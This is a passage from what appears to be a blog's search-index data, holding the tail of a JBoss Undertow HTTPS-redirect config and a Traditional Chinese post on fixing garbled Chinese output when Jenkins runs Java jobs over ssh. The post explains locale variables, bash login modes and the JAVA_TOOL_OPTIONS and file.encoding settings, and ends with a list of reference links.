class=\"name\">buffer-cache</span> <span class=\"attr\">name</span>=<span class=\"string\">\"default\"</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">server</span> <span class=\"attr\">name</span>=<span class=\"string\">\"default-server\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">http-listener</span> <span class=\"attr\">name</span>=<span class=\"string\">\"default\"</span> <span class=\"attr\">socket-binding</span>=<span class=\"string\">\"http\"</span> <span class=\"attr\">redirect-socket</span>=<span class=\"string\">\"https\"</span> <span class=\"attr\">enable-http2</span>=<span class=\"string\">\"true\"</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">https-listener</span> <span class=\"attr\">name</span>=<span class=\"string\">\"https\"</span> <span class=\"attr\">socket-binding</span>=<span class=\"string\">\"https\"</span> <span class=\"attr\">security-realm</span>=<span class=\"string\">\"ApplicationRealm\"</span> <span class=\"attr\">enable-http2</span>=<span class=\"string\">\"true\"</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">host</span> <span class=\"attr\">name</span>=<span class=\"string\">\"default-host\"</span> <span class=\"attr\">alias</span>=<span class=\"string\">\"localhost\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">location</span> <span class=\"attr\">name</span>=<span class=\"string\">\"/\"</span> <span class=\"attr\">handler</span>=<span class=\"string\">\"welcome-content\"</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filter-ref</span> <span class=\"attr\">name</span>=<span class=\"string\">\"server-header\"</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filter-ref</span> <span class=\"attr\">name</span>=<span class=\"string\">\"x-powered-by-header\"</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">http-invoker</span> <span class=\"attr\">security-realm</span>=<span class=\"string\">\"ApplicationRealm\"</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filter-ref</span> <span class=\"attr\">name</span>=<span class=\"string\">\"http-to-https\"</span> <span class=\"attr\">predicate</span>=<span class=\"string\">\"equals(%p,8080)\"</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">host</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">server</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-container</span> <span class=\"attr\">name</span>=<span class=\"string\">\"default\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">jsp-config</span> <span class=\"attr\">development</span>=<span class=\"string\">\"true\"</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">websockets</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-container</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">handlers</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">file</span> <span class=\"attr\">name</span>=<span class=\"string\">\"welcome-content\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"$&#123;jboss.home.dir&#125;/welcome-content\"</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">handlers</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filters</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">response-header</span> <span class=\"attr\">name</span>=<span class=\"string\">\"server-header\"</span> <span class=\"attr\">header-name</span>=<span class=\"string\">\"Server\"</span> <span class=\"attr\">header-value</span>=<span class=\"string\">\"JBoss-EAP/7\"</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">response-header</span> <span class=\"attr\">name</span>=<span class=\"string\">\"x-powered-by-header\"</span> <span class=\"attr\">header-name</span>=<span class=\"string\">\"X-Powered-By\"</span> <span class=\"attr\">header-value</span>=<span class=\"string\">\"Undertow/1\"</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">rewrite</span> <span class=\"attr\">name</span>=<span class=\"string\">\"http-to-https\"</span> <span class=\"attr\">redirect</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">target</span>=<span class=\"string\">\"https://%h:8443%U\"</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">filters</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">subsystem</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n","categories":["JBoss"],"tags":["jboss","http","https"]},{"title":"Jenkins 執行 Java 程式亂碼解決方法","url":"/blog/2020/07/30/Jenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/","content":"<p>最近公司上板 Java 排程程式都會遇到亂碼 ????<br>這個都不能手動執行<br>今天解決這個問題<br>整理一下</p>\n<a id=\"more\"></a>\n<p>首先，簡單講一下<br>我們 jenkins 上板程式是透過 ssh 打指令操作</p>\n<blockquote>\n<p>這邊我備註一下，我們公司上板 Java 程式，是排程程式，這些排程不是使用 Crontab 方式去執行<br>所以這邊執行都是透過 shell 腳本方式去重複執行</p>\n</blockquote>\n<p>有在家目錄使用<code>socure ~/.profile</code><br>但是這個過程<br>奇怪的是 locale 查看出來的 LC_CTYPE=en_US.UTF8 其他都是 POSIX<br>一般用 Xshell 登入是 locale 全看到 en_US.UTF8</p>\n<p>這邊我還不確定是什麼原因?</p>\n<blockquote>\n<p>non-interactive + non-login shell<br>最後一種模式為非交互非登陸的shell，創建這種shell典型有兩種方式：<br>   bash script.sh<br>    ssh user@remote command<br>這兩種都是創建一個shell，執行完腳本之後便退出，不再需要與用戶交互。</p>\n</blockquote>\n<p><a href=\"https://blog.csdn.net/whitehack/article/details/51705889\" target=\"_blank\" rel=\"noopener\">ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量</a> <a href=\"/blog/2020/07/30/Jenkins-執行-Java-程式亂碼解決方法/web1.png\" title=\"備份圖\">備份圖</a><br>目前看到這篇有疑似這個問題<br>所以導致登入環境變數會有不一樣結果<br>我也沒看到有設定 BASH_ENV 參數</p>\n<p>不過確實因為 ssh remote  command 登入<br>造就登入不一樣結果</p>\n<p>裡面有滿清楚內容<a href=\"https://blog.csdn.net/whitehack/article/details/51705889\" target=\"_blank\" rel=\"noopener\">ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量</a></p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|                | login  |interactive|non-interactive|</span><br><span class=\"line\">|                |        |non-login  |non-login      |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|/etc/profile    |   A    |           |               |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|/etc/bash.bashrc|        |    A      |               |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|~/.bashrc       |        |    B      |               |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|~/.bash_profile |   B1   |           |               |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|~/.bash_login   |   B2   |           |               |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|~/.profile      |   B3   |           |               |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br><span class=\"line\">|BASH_ENV        |        |           |       A       |</span><br><span class=\"line\">+----------------+--------+-----------+---------------+</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>配置文件建議</p>\n<p>回顧一下前面提到的所有配置文件，總共有以下幾種：</p>\n<p>   /etc/profile<br>   ~/.bash_profile<br>   ~/.bash_login<br>   ~/.profile<br>   /etc/bash.bashrc<br>   ~/.bashrc<br>   $BASH_ENV<br>   $ENV</p>\n<p>不知你是否會有疑問，這麼多的配置文件，究竟每個文件裡面應該包含哪些配置，比如PATH應該在哪？提示符應該在哪配置？啟動的程序應該在哪？等等。所以在文章的最後，我蒐羅了一些最佳實踐供各位參考。（這裡只討論屬於用戶個人的配置文件）</p>\n<p>   ~/.bash_profile：應該儘可能的簡單，通常會在最後加載.profile和.bashrc(注意順序)<br>   ~/.bash_login：在前面討論過，別用它<br>   ~/.profile：此文件用於login shell，所有你想在整個用戶會話期間都有效的內容都應該放置於此，比如啟動進程，環境變量等<br>   ~/.bashrc：只放置與bash有關的命令，所有與交互有關的命令都應該出現在此，比如bash的補全、alias、顏色、提示符等等。特別注意：別在這裡輸出任何內容（我們前面只是為了演示，別學我哈）</p>\n</blockquote>\n<p>因為我猜測 jenkins 進去跟我用 xshell 語系不一樣<br>所以就做了 log 紀錄，發現真的不一樣<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> LC_ALL=<span class=\"string\">\"en_US.UTF-8\"</span></span><br><span class=\"line\">date &gt;&gt; /tmp/test_ssh.log</span><br><span class=\"line\">env &gt;&gt; /tmp/test_ssh.log</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"--------\"</span> &gt;&gt; /tmp/test_ssh.log</span><br><span class=\"line\">locale &gt;&gt; /tmp/test_ssh.log</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"=======\"</span> &gt;&gt; /tmp/test_ssh.log</span><br></pre></td></tr></table></figure></p>\n<p>之前看到使用 file.enconding 去解決<br><del>但實際用上卻沒有效果</del><br>跟 file.enconding 沒關係，是我使用 JAVA_OPTS環境變數<br>沒有效果，後面會講到</p>\n<blockquote>\n<p>java 預設在處理文字檔案的寫入時，<br>會以 os 的預設編碼當作寫入的編碼規則，<br>這個問題常會發生在 windows 英文的作業系統要寫入中文的時候發生，</p>\n<p>解法1：<br>如果是用 java 執行的 jar ，<br>java -Dfile.encoding=UTF8 -jar e:\\bin\\ExportToFile.jar</p>\n<p>解法2：<br>加入環境變數 JAVA_OPTS，<br>  windows 環境：<br>JAVA_OPTS=-Dfile.encoding=UTF8;%JAVA_OPTS%<br>  linux 環境：<br>$&gt; export JAVA_OPTS=-Dfile.encoding=UTF8:$JAVA_OPTS</p>\n<p>解法3：<br>在程式裡面設定：<br>取得目前系統檔案編碼屬性 String defaultEncodingName = System.getProperty( “file.encoding” );<br>設定系統檔案編碼屬性 System.setProperty(“file.encoding”, “UTF-8”);<br><a href=\"https://blog.xuite.net/akuox/caffeine/32265749-%E8%A7%A3%E6%B1%BA+java+%E5%AF%AB%E6%AA%94%E7%9A%84%E4%B8%AD%E6%96%87%E4%BA%82%E7%A2%BC%E5%95%8F%E9%A1%8C\" target=\"_blank\" rel=\"noopener\">解決 java 寫檔的中文亂碼問題 @ caffeine :: 隨意窩 Xuite日誌</a></p>\n</blockquote>\n<h2 id=\"了解一下-LC-環境變數\"><a href=\"#了解一下-LC-環境變數\" class=\"headerlink\" title=\"了解一下 LC_* 環境變數\"></a>了解一下 LC_* 環境變數</h2><h3 id=\"wiki\"><a href=\"#wiki\" class=\"headerlink\" title=\"wiki\"></a>wiki</h3><blockquote>\n<p>在Ubuntu作業系統中，使用man locale-gen或man locale可獲得關於locale實現的細節。實際上是由glibc庫實現的。</p>\n<p>locale相關（環境）變數生效的優先順序：[1]</p>\n<pre><code>LANGUAGE 指定個人對語言環境值的主次偏好，例如zh_CN:en_US:en\nLC_ALL 這不是一個環境變數，是一個可被C語言庫函式setlocale設定的宏，其值可覆蓋所有其他的locale設定。因此&gt; 預設時此值為空\nLC_xxx 可設定locale各方面（category）的值，可以覆蓋LANG的值。\nLANG 指定預設使用的locale值\n</code></pre><p>可以把上述環境變數設在/etc/profile 或 /etc/environment等系統初始檔案中。值得注意的是，若LANG或LC_ALL被設&gt; 定為 “C”，那麼LANGUAGE的值將被忽視。 [2]</p>\n<p>除 C 和 POSIX這兩個locale名稱外，locale的名稱並未標準化。Linux平台與Windows系統的locale名稱有很大不同。&gt; Linux名稱的命名規則為：</p>\n<p> language[_territory[.codeset]][@modifier]</p>\n<p>其中language是ISO 639-1標準中定義的雙字母的語言代碼</p>\n</blockquote>\n<h3 id=\"暫時語系用法\"><a href=\"#暫時語系用法\" class=\"headerlink\" title=\"暫時語系用法\"></a>暫時語系用法</h3><p>感覺是暫時環境變數，但沒有詳細看到有人這樣介紹</p>\n<blockquote>\n<p>$ LC_TIME=en_US.UTF-8 date<br>Fri Oct 31 19:51:16 CST 2014<br>$ LC_TIME=fi_FI.UTF-8 date<br>pe 31.10.2014 19.52.00 +0800<br>$ LC_TIME=zh_CN.UTF-8 date<br>2014年 10月 31日 星期五 19:53:07 CST</p>\n</blockquote>\n<p>PS: 上面使用 locale -a 有安裝成功的才能用</p>\n<h3 id=\"POSIX-和-C\"><a href=\"#POSIX-和-C\" class=\"headerlink\" title=\"POSIX 和 C\"></a>POSIX 和 C</h3><p><a href=\"https://jaminzhang.github.io/linux/Change-Linux-System-Locale-Envs/\" target=\"_blank\" rel=\"noopener\">更改 Linux 系統語言環境變量 - Jamin Zhang</a></p>\n<blockquote>\n<p>LC_ALL=C 是為了去除所有本地化的設置，讓命令能正確執行。<br>C 是系統默認的 locale，」POSIX」是」C」的別名。所以當我們新安裝完一個系統時，默認的 locale 就是 C 或 POSIX。</p>\n</blockquote>\n<h3 id=\"to-default-locale-No-such-file-or-directory\"><a href=\"#to-default-locale-No-such-file-or-directory\" class=\"headerlink\" title=\"to default locale: No such file or directory\"></a>to default locale: No such file or directory</h3><p><a href=\"https://samwhelp.github.io/note-ubuntu-18.04/read/howto/install/locale/\" target=\"_blank\" rel=\"noopener\">Locale - Ubuntu 18.04 探索筆記</a></p>\n<p>會多出現三行</p>\n<p>ssh remote bash 登入使用 locale 指令會出現 </p>\n<blockquote>\n<p>locale: Cannot set LC_CTYPE to default locale: No such file or directory<br>locale: Cannot set LC_MESSAGES to default locale: No such file or directory<br>locale: Cannot set LC_ALL to default locale: No such file or directory</p>\n<p>只要執行下面的指令，就可以解決</p>\n<p>$ sudo locale-gen zh_TW.UTF-8</p>\n</blockquote>\n<p>但我沒使用這個方案解決</p>\n<p>至於原因可能是<br><a href=\"https://blog.csdn.net/wojiuwangla/article/details/107556417\" target=\"_blank\" rel=\"noopener\">Linux Xshell登录报错 locale: Cannot set LC_CTYPE to default locale: No such file or directory（已解决）_醉世老翁的博客-CSDN博客_locale -a locale: cannot set lc_ctype to default l</a><br><a href=\"https://blog.csdn.net/guitar___/article/details/77651983\" target=\"_blank\" rel=\"noopener\">CentOS6.5手动安装glibc-2.14后locale出现No such file or directory终极解决办法_guitar___的博客-CSDN博客_centos character map file `utf-8 not found: no su</a></p>\n<h2 id=\"查看-Java-file-encoding\"><a href=\"#查看-Java-file-encoding\" class=\"headerlink\" title=\"查看 Java file encoding\"></a>查看 Java file encoding</h2><p><a href=\"https://dzone.com/articles/java-may-use-utf-8-as-its-default-charset\" target=\"_blank\" rel=\"noopener\">Java May Use UTF-8 as its Default Charset - DZone Java</a></p>\n<p>CharsetDemo.java<br><figure class=\"highlight java\"><figcaption><span>CharsetDemo.java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CharsetDemo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">    * Supplies the default encoding without using Charset.defaultCharset()</span></span><br><span class=\"line\"><span class=\"comment\">    * and without accessing System.getProperty(\"file.encoding\").</span></span><br><span class=\"line\"><span class=\"comment\">    *</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@return</span> Default encoding (default charset).</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">getEncoding</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">final</span> <span class=\"keyword\">byte</span> [] bytes = &#123;<span class=\"string\">'D'</span>&#125;;</span><br><span class=\"line\">      <span class=\"keyword\">final</span> InputStream inputStream = <span class=\"keyword\">new</span> ByteArrayInputStream(bytes);</span><br><span class=\"line\">      <span class=\"keyword\">final</span> InputStreamReader reader = <span class=\"keyword\">new</span> InputStreamReader(inputStream);</span><br><span class=\"line\">      <span class=\"keyword\">final</span> String encoding = reader.getEncoding();</span><br><span class=\"line\">      <span class=\"keyword\">return</span> encoding;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] arguments)</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">      out.println(<span class=\"string\">\"Default Locale:   \"</span> + Locale.getDefault());</span><br><span class=\"line\">      out.println(<span class=\"string\">\"Default Charset:  \"</span> + Charset.defaultCharset());</span><br><span class=\"line\">      out.println(<span class=\"string\">\"file.encoding:    \"</span> + System.getProperty(<span class=\"string\">\"file.encoding\"</span>));</span><br><span class=\"line\">      out.println(<span class=\"string\">\"sun.jnu.encoding: \"</span> + System.getProperty(<span class=\"string\">\"sun.jnu.encoding\"</span>));</span><br><span class=\"line\">      out.println(<span class=\"string\">\"Default Encoding: \"</span> + getEncoding());</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://blog.csdn.net/ly199108171231/article/details/85253946\" target=\"_blank\" rel=\"noopener\">環境變量JAVA_TOOL_OPTIONS、_JAVA_OPTIONS、JAVA_OPTS設置_ly199108171231的博客-CSDN博客_java_options</a> <a href=\"/blog/2020/07/30/Jenkins-執行-Java-程式亂碼解決方法/web2.png\" title=\"備份圖\">備份圖</a><br>這邊查到 JAVA_OPTS 是 Tomcat 用的<br>難怪我試個老半天都沒有什麼效果<br>JAVA_TOOL_OPTIONS 確實就正常了</p>\n<blockquote>\n<p>   JAVA_OPTS：常用於一些應用的配置，如Tomcat，但它一般不作為環境變量，也不能被JVM識別的，是那些應用的自定義配置；<br>   _JAVA_OPTIONS：也是作為環境變量來替代命令行參數的，但它是JVM廠家自定義的，可以覆蓋JAVA_TOOL_OPTIONS，但各廠家的不同，_JAVA_OPTIONS是Oracle的JVM，而IBM的則是用IBM_JAVA_OPTIONS。<br>    JAVA_TOOL_OPTIONS：是標準的，所有虛擬機都能識別和應用的。</p>\n<p>如果想驗證上面的不同也不難，如果設置了JVM能識別的環境變量，JVM會有”Picked up”的提示的，如：</p>\n<pre><code>export JAVA_OPTS=zhaiqiafneng\nexport JAVA_TOOL_OPTIONS=&quot;-Xmx512m -Xms64m&quot; \n\njava -version \n</code></pre><p>JVM會打印：</p>\n<pre><code>Picked up JAVA_TOOL_OPTIONS: -Xmx512m -Xms64m\njava version &quot;1.8.0_101&quot;\nJava(TM) SE Runtime Environment (build 1.8.0_101-b13)\nJava HotSpot(TM) 64-Bit Server VM (build 25.101-b13, mixed mode)\n</code></pre></blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Big5</span></span><br><span class=\"line\">LC_ALL=zh_TW.BIG5  java Xxxx</span><br><span class=\"line\"><span class=\"comment\"># Big5</span></span><br><span class=\"line\">java -Dfile.encoding=big5 Xxxx</span><br><span class=\"line\"><span class=\"comment\"># Big5</span></span><br><span class=\"line\">LC_ALL=zh_TW.UTF8  java -Dfile.encoding=big5 Xxxx</span><br></pre></td></tr></table></figure>\n<p>排程踩雷注意<br><a href=\"https://blog.csdn.net/wojiuwangla/article/details/107365921\" target=\"_blank\" rel=\"noopener\">linux 中crontab 定时 shell脚本启动jar包，tomcat失败_醉世老翁的博客-CSDN博客_linux 定时任务启动的tomcat jar包不一样</a></p>\n<h3 id=\"Java-properties-and-XML-and-log4j\"><a href=\"#Java-properties-and-XML-and-log4j\" class=\"headerlink\" title=\"Java  properties and XML and log4j\"></a>Java  properties and XML and log4j</h3><p>固定都吃 ISO-8859-1<br>.properties檔案的編碼是ISO-8859-1，又稱為Latin-1。所有非Latin-1字元必須利用Unicode跳脫字元錄入，例如\\uHHHH中，HHHH是某個字元的Unicode字元集的十六進位的索引。這樣就可以使用.properties檔案作為在地化的屬性資源包。非Latin-1的文字檔案，可以通過使用隨JDK提供的native2ascii工具轉換為正確的.properties檔案；或使用如po2prop[1]的第三方工具，管理雙語在地化格式跳脫為.properties</p>\n<p>難怪… .properties 無法正常看到 UTF-8</p>\n<p><a href=\"https://zh.wikipedia.org/zh-tw/.properties\" target=\"_blank\" rel=\"noopener\">.properties - 維基百科，自由的百科全書</a></p>\n<p>XML 是吃 UTF-8</p>\n<p>原本想獨立寫一篇測試<br>但內容不太多，所以就整理在這邊</p>\n<p>log4j 也能設定指定 encoding，不過…這邊跟 Java 一樣，預設是帶 System 帶入的<br><a href=\"http://tw.gitbook.net/log4j/log4j_logging_files.html\" target=\"_blank\" rel=\"noopener\">log4j日誌記錄到文件 - Log4j教學</a></p>\n<h2 id=\"相關網站整理\"><a href=\"#相關網站整理\" class=\"headerlink\" title=\"相關網站整理\"></a>相關網站整理</h2><p>裡面也混雜一些彩蛋</p>\n<ul>\n<li><a href=\"https://www.csie.ntu.edu.tw/~r95053/samples/collection/backup/locale2.html\" target=\"_blank\" rel=\"noopener\">區域化環境類別 (categories)</a></li>\n<li><a href=\"https://openhome.cc/Gossip/Encoding/LocaleTag.html\" target=\"_blank\" rel=\"noopener\">地區標籤</a></li>\n<li><a href=\"http://tw.gitbook.net/java/util/locale_getdefault.html\" target=\"_blank\" rel=\"noopener\">java.util.Locale.getDefault()方法實例 - Java.util包</a></li>\n<li><a href=\"https://www.cnblogs.com/xlmeng1988/archive/2013/01/16/locale.html\" target=\"_blank\" rel=\"noopener\">locale的设定及LANG、LC_CTYPE、LC_ALL环境变量 - Lo0ong - 博客园</a></li>\n<li><a href=\"https://kaix.dev/2018/06/30/macos-ssh-chinese/\" target=\"_blank\" rel=\"noopener\">解決 macOS SSH 連線中文亂碼的問題 - Kaix Blog</a></li>\n<li><a href=\"https://www.jianshu.com/p/8d8aef212b25\" target=\"_blank\" rel=\"noopener\">jvm 性能调优工具之 jinfo - 简书</a></li>\n<li><a href=\"https://blog.csdn.net/clamaa/article/details/70046217\" target=\"_blank\" rel=\"noopener\">locale错误导致Java中文乱码错误的总结_clamaa的专栏-CSDN博客_java locale 中文乱码</a></li>\n<li><a href=\"https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/380106/\" target=\"_blank\" rel=\"noopener\">詳解Linux中文亂碼問題終極解決方法 | 程式前沿</a></li>\n<li><a href=\"https://blog.csdn.net/laven90/article/details/9285307\" target=\"_blank\" rel=\"noopener\">locale的设定及LANG、LC_CTYPE、LC_ALL环境变量<em>laven90的专栏-CSDN博客</em>如何设置 locale</a></li>\n<li><a href=\"https://blog.xuite.net/akuox/caffeine/32265749-%E8%A7%A3%E6%B1%BA+java+%E5%AF%AB%E6%AA%94%E7%9A%84%E4%B8%AD%E6%96%87%E4%BA%82%E7%A2%BC%E5%95%8F%E9%A1%8C\" target=\"_blank\" rel=\"noopener\">解決 java 寫檔的中文亂碼問題 @ caffeine :: 隨意窩 Xuite日誌</a></li>\n<li><a href=\"https://iter01.com/64096.html\" target=\"_blank\" rel=\"noopener\">Linux下配置Jenkins+gitlab持續整合構建流程 | IT人</a></li>\n<li><a href=\"https://blog.csdn.net/jiangshanwe/article/details/85785226\" target=\"_blank\" rel=\"noopener\">Jenkins使用/etc/profile中环境变量异常_jiangshanwe-CSDN博客_jenkins /etc/profile</a></li>\n<li><a href=\"https://stackoverflow.com/questions/5818403/jenkins-hudson-environment-variables\" target=\"_blank\" rel=\"noopener\">Jenkins / Hudson environment variables - Stack Overflow</a></li>\n<li><a href=\"https://blog.gtwang.org/linux/ps-top-find-processes-by-cpu-memory-usage/\" target=\"_blank\" rel=\"noopener\">Linux 用 ps 與 top 指令找出最耗費 CPU 與記憶體資源的程式 - G. T. Wang</a></li>\n<li><a href=\"https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/380106/\" target=\"_blank\" rel=\"noopener\">詳解Linux中文亂碼問題終極解決方法 | 程式前沿</a></li>\n<li><a href=\"https://jaminzhang.github.io/linux/Change-Linux-System-Locale-Envs/\" target=\"_blank\" rel=\"noopener\">更改 Linux 系统语言环境变量 - Jamin Zhang</a></li>\n<li><a href=\"https://blog.csdn.net/clamaa/article/details/70046217\" target=\"_blank\" rel=\"noopener\">locale错误导致Java中文乱码错误的总结_clamaa的专栏-CSDN博客_java locale 中文乱码</a></li>\n<li><a href=\"http://hazirguo.github.io/articles/2017/bash_login_interactive_mode.html\" target=\"_blank\" rel=\"noopener\">bash 四种工作模式及其相关的配置文件</a></li>\n<li><a href=\"https://blog.csdn.net/hudashi/article/details/82464995\" target=\"_blank\" rel=\"noopener\">Linux系统bash的四种模式与jenkins执行shell的环境变量问题_Robin Hu的专栏-CSDN博客_jenkins shell环境变量</a></li>\n<li><a href=\"https://blog.csdn.net/whitehack/article/details/51705889\" target=\"_blank\" rel=\"noopener\">ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量</a></li>\n<li><a href=\"https://github.com/sdkman/sdkman-cli/issues/640\" target=\"_blank\" rel=\"noopener\">SDKMAN is able to install on Java on ARM · Issue #640 · sdkman/sdkman-cli</a></li>\n</ul>\n<h3 id=\"其他連結-很多重複\"><a href=\"#其他連結-很多重複\" class=\"headerlink\" title=\"其他連結(很多重複)\"></a>其他連結(很多重複)</h3><ul>\n<li><a href=\"https://cr.openjdk.java.net/~iris/se/12/latestSpec/api/java.base/java/io/FileWriter.html\" target=\"_blank\" rel=\"noopener\">FileWriter (Java SE 12 )</a></li>\n<li><a href=\"https://www.twblogs.net/a/5b8812fc2b71775d1cda5350\" target=\"_blank\" rel=\"noopener\">Java丨Cmd運行Jar出現亂碼問題 - 台部落</a></li>\n<li><a href=\"https://blog.csdn.net/qq_27292113/article/details/71404298\" target=\"_blank\" rel=\"noopener\">Linux中java log输出中文乱码 中文变“?”_一起进步的博客-CSDN博客_linux log日志中文乱码</a></li>\n<li><a href=\"https://blog.csdn.net/btt2013/article/details/54616793?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.channel_param\" target=\"_blank\" rel=\"noopener\">linux中使用tail -f查看日志出现中文乱码的解决方案_付之一笑的专栏-CSDN博客_linux 日志乱码</a></li>\n<li><a href=\"https://download.csdn.net/download/tw121256081/9427273\" target=\"_blank\" rel=\"noopener\">log4j日志文件乱码解决方法_log4j中文乱码,log4j中文乱码-Java文档类资源-CSDN下载</a></li>\n<li><a href=\"https://blog.csdn.net/sui102/article/details/84495497\" target=\"_blank\" rel=\"noopener\">Linux下中文变问号的解决办法_sui102的专栏-CSDN博客_liunx windows 中文字符变问号</a></li>\n<li><a href=\"https://download.csdn.net/download/adnaper/4710011\" target=\"_blank\" rel=\"noopener\">log4j乱码问题解决办法_linux上配置log4j,linux配置log4j-Java文档类资源-CSDN下载</a></li>\n<li><a href=\"https://blog.gtwang.org/programming/url-percent-encoding-and-decoding-using-java/\" target=\"_blank\" rel=\"noopener\">Java 程式處理網址 URL 百分比編碼與解碼教學 - G. T. Wang</a></li>\n<li><a href=\"https://www.itread01.com/p/848586.html\" target=\"_blank\" rel=\"noopener\">Java讀帶有BOM的UTF-8檔案亂碼 - IT閱讀</a></li>\n<li><a href=\"https://blog.csdn.net/haixia_12/article/details/42424513\" target=\"_blank\" rel=\"noopener\">Java -Dfile.encoding=UTF-8的使用_haixia_12的专栏-CSDN博客_-dfile.encoding=utf-8</a></li>\n<li><a href=\"http://www.coderli.com/log4j-console-file-garbled/\" target=\"_blank\" rel=\"noopener\">log4j 控制台和文件输出乱码问题解决</a></li>\n<li><a href=\"https://www.itread01.com/p/570130.html\" target=\"_blank\" rel=\"noopener\">[轉]log4j日誌檔案亂碼問題的解決方法 - IT閱讀</a></li>\n<li><a href=\"https://stackoverflow.com/questions/361975/setting-the-default-java-character-encoding\" target=\"_blank\" rel=\"noopener\">utf 8 - Setting the default Java character encoding - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/6031877/jvm-property-dfile-encoding-utf8-or-utf-8\" target=\"_blank\" rel=\"noopener\">file - JVM property -Dfile.encoding=UTF8 or UTF-8? - Stack Overflow</a></li>\n<li><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/99795/\" target=\"_blank\" rel=\"noopener\">理解環境變數 JAVA_TOOL_OPTIONS | 程式前沿</a></li>\n<li><a href=\"https://www.google.com/search?client=firefox-b-d&amp;q=%E7%89%99%E6%A0%B9+%E6%9C%83%E7%97%9B+%E5%81%87%E7%89%99\" 